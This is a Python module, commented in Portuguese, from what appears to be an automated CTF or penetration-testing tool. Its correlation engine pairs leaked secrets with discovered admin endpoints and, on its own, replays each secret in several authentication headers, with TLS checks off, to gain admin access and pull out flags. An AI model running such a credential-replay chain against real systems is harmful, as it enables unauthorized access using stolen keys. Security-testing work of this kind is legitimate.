import httpx
import re
from .logger import logger
from .models import Vulnerability

class CorrelationEngine:
    def correlate(self, kb, ctx=None):
        chains = []

        # Regra de JWT Genérica
        if kb.recall("jwt_secret") and kb.recall("admin_endpoint"):
            chains.append({
                "name":"jwt_admin_chain",
                "priority":100
            })

        # 🕵️ CADEIA DE ESCALONAMENTO DE PRIVILÉGIOS (v6.3)
        leaked_secrets = kb.recall("leaked_secret")
        
        # Recupera alvos administrativos da KnowledgeBase (populado via DAD no intel.py)
        admin_endpoints = kb.recall("discovered_path") or []
        admin_endpoints = [ep for ep in admin_endpoints if "admin" in ep.lower()]
        
        # Fallback: Se ctx foi passado, busca no session (Garante os 57+ alvos)
        if ctx and not admin_endpoints:
            all_eps = ctx.session.recall("_all_discovered_endpoints", [])
            admin_endpoints = [ep for ep in all_eps if "admin" in ep.lower()]

        if leaked_secrets and admin_endpoints:
            logger.warning(f"CORRELAÇÃO: Segredo vazado detectado junto com {len(admin_endpoints)} rotas administrativas.")
            
            for secret in leaked_secrets:
                for ep in admin_endpoints:
                    chains.append({
                        "name": f"Leaked Key -> Admin Access ({ep})",
                        "priority": 100
                    })
                    
                    if not ctx: 
                        continue # Requer contexto para disparar ataque autônomo
                    
                    # 🚀 EXECUÇÃO AUTÔNOMA DA CADEIA
                    logger.info(f"Executando Cadeia de Ataque: Tentando acessar {ep} com o segredo roubado...")
                    
                    # Tenta injetar o segredo nos headers mais comuns de autenticação
                    headers_to_try = [
                        {"Authorization": f"Bearer {secret}"},
                        {"Authorization": secret},
                        {"X-API-Key": secret},
                        {"Token": secret}
                    ]
                    
                    for headers in headers_to_try:
                        try:
                            # Requisição direta para validar o bypass
                            r = httpx.get(
                                f"{ctx.session.target.rstrip('/')}/{ep.lstrip('/')}", 
                                headers=headers, 
                                verify=False, 
                                timeout=3.0
                            )
                            
                            if r.status_code == 200 and ("FLAG{" in r.text or "CTF{" in r.text):
                                logger.info(f"🔥 CADEIA CONCLUÍDA: Acesso administrativo obtido via {list(headers.keys())[0]}!")
                                
                                # Registra a vulnerabilidade confirmada
                                ctx.session.add_vulnerability(Vulnerability(
                                    module="correlation_engine",
                                    name="Privilege Escalation via Leaked Key",
                                    description=f"Acesso total ao endpoint {ep} utilizando o segredo vazado.",
                                    severity="Critical",
                                    confidence=1.0
                                ))
                                
                                # Extrai a flag
                                found_flags = re.findall(r'(?:CTF|FLAG|HTB|picoCTF|DUCTF)\{[^}]+\}', r.text, re.IGNORECASE)
                                for f in found_flags:
                                    ctx.session.flag(f)
                                
                                return chains # Sucesso, podemos parar
                        except Exception as e:
                            logger.error(f"Erro ao executar cadeia de correlação: {e}")

        return chains
